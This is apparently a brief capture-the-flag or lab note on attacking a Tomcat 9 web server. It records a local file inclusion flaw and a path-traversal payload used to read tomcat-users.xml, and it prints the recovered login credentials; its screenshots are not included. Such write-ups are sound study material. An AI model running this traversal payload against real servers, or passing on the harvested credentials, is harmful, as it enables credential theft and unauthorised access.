# Web server on 80

![[Pasted image 20211213120635.png]]

LFI Exploitable
![[Pasted image 20211213120700.png]]

Cant RCE on this LFI.
Searching for users of tomcat server (tomcat 9)
payload;
```bash
../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

![[Pasted image 20211213121637.png]]

Creds:tomcat:$3cureP4s5w0rd123